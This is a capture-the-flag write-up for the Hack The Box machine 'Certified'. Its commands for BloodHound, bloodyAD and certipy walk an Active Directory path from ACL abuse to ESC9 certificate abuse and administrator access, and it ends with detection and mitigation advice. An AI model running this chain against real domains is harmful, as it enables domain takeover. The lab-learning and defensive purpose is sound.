---
machine: Certified
os: Windows
difficulty: Medium
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, adcs, esc9, certipy, pkinit]
---

# Certified — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real credentials or flags.

## Summary

An “assume breach” box starting from a low-privilege account. BloodHound shows `WriteOwner` over the Management group, `GenericWrite` over `Management_SVC` and `GenericAll` over `CA_Operator`. That control allows changing the victim's UPN and abusing ESC9 in AD CS to obtain a certificate as Administrator.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> -u <USER> -p '<PASSWORD>' --shares
bloodhound-python -u <USER> -p '<PASSWORD>' -d certified.htb -ns <IP> -c All
```

BloodHound draws the path:

```text
judith.mader -> WriteOwner -> Management
Management -> GenericWrite -> Management_SVC
Management_SVC -> GenericAll -> CA_Operator
```

Take ownership of the group and add the user:

```bash
bloodyAD -d certified.htb -u <USER> -p '<PASSWORD>' --host <DC> \
  set owner Management <USER>
bloodyAD -d certified.htb -u <USER> -p '<PASSWORD>' --host <DC> \
  add groupMember Management <USER>
```

## Initial access

With `GenericWrite` over `Management_SVC`, change its password or UPN. Use it to obtain a session and then control `CA_Operator`.

```bash
netexec winrm <IP> -u Management_SVC -p '<PASSWORD>'
```

## Escalation

Enumerate AD CS:

```bash
certipy find -u <USER> -p '<PASSWORD>' -dc-ip <IP> -vulnerable -stdout
```

The vulnerable template lacks the Security Extension (ESC9). `GenericAll` over `CA_Operator` allows changing its UPN to `administrator`; request the certificate, restore the UPN and authenticate with PKINIT:

```bash
certipy account update -u Management_SVC -p '<PASSWORD>' -user CA_Operator -upn administrator
certipy req -u CA_Operator -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -dc-ip <IP>
certipy account update -u Management_SVC -p '<PASSWORD>' -user CA_Operator -upn ca_operator@certified.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

The TGT/PFX grants Administrator access to the DC and the flags.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lessons

- `WriteOwner` over a group is an effective privilege even without “admin”.
- ESC9 combines a right over the victim with a template lacking the Security Extension.
- Changing and restoring the UPN lowers the footprint but leaves 4738 events.
- Certificate authentication (PKINIT) avoids depending on the password.

## Detection and mitigation

- Audit `WriteOwner`, `GenericWrite` and `GenericAll` over groups and users.
- Review templates with `CT_FLAG_NO_SECURITY_EXTENSION`.
- Alert on UPN changes (4738) and unusual certificate issuance.
- Apply the ESC9 patch and separate CA roles.

## References

- <https://0xdf.gitlab.io/2025/03/15/htb-certified.html>
- <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>
- <https://attack.mitre.org/techniques/T1649/>
